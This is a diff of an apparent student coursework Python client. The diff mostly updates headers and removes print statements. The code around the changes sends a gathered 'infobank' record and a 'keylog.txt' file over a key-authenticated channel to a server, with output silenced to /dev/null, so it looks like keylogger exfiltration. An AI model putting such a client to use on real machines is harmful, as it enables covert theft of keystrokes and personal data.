@@ -1,7 +1,6 @@
-# test_client.py
-
+#!/usr/bin/env/python3
 #==============================================================================
- #   Assignment:  Major Project - Tunelling Milestone 1
+ #   Assignment:  Major Project - Final
  #
  #       Author:  Alistair Godwin, Micheal Sciortino, Francesso Losi
  #     Language:  Python 3
@@ -10,8 +9,8 @@
  #
  #    Class:  DPI912 
  #    Professor:  Harvey Kaduri
- #    Due Date:  Mar 24th 2020 
- #    Submitted: Mar 22nd 2020
+ #    Due Date:  April 17, 2020 
+ #    Submitted: April 17, 2020
  #
  #-----------------------------------------------------------------------------
  #
@@ -49,7 +48,6 @@ logzero.logfile("clientLogger.log", maxBytes=1e6, backupCount=2)
 cwd = os.path.dirname(os.path.realpath(sys.argv[0]))
 keyLoc = cwd
 keyLoc +=  '/test_rsa.key'
-
 
 def getInput():
     '''
@@ -178,7 +176,6 @@ def sendFile(dataFile,  keyLoc, filename):
     '''
     chan = connect(keyLoc) #connect
     if filename == 'infobank.txt':
-        print(filename)
         #send this filename
         strn = filename
         
@@ -190,7 +187,6 @@ def sendFile(dataFile,  keyLoc, filename):
             for values in indexes:
                 str += values + ","
             str += "|"
-        print(str)
         chan.sendall(str.encode('utf-8'))
     
     elif filename == 'keylog.txt':
@@ -207,15 +203,11 @@ def sendFile(dataFile,  keyLoc, filename):
         
     chan.close()
     return 0
-def run( stdin='/dev/null', stdout='/dev/null', stderr='/dev/null'):
-    
+def run( stdin='/dev/null', stdout='/dev/null', stderr='/dev/null'): 
     ''''
     This function handles the running of the client from start to finish
     @params - standard logging vars
     '''
-    
-
-    
     infoBank = getInput()
     sendFile(infoBank,  keyLoc,  'infobank.txt')
     
